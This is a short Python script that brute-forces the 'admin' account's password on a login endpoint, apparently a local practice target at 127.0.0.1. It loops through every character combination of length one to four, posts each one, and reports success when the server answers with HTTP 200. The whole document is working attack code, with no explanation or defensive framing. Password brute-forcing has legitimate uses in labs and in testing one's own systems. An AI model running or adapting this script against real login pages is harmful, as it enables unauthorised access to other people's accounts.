import sys
import requests
import itertools

LOWER = "abcdefghijklmnopqrstuvwxyz"
UPPER = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
SPECIAL = "!#$%&/()=?¡¿+[];:.,"
DIGITS = "0123456789"

ALPHABET = LOWER + UPPER + SPECIAL + DIGITS

def main():
    url =  "http://127.0.0.1:8000/login"
    user = "admin"

    for r in range(1,5):
        for combination in itertools.product(ALPHABET, repeat=r):
            combination = "".join(combination)
            try:
                resp = requests.post(url, data={"username": user, "password": combination }, timeout=1)
                if resp.status_code == 200:
                    print("Login Successful - ",combination)
                    sys.exit(0)
            except requests.RequestException as e:
                print("Request error:", e)

if __name__ == "__main__":
    main()
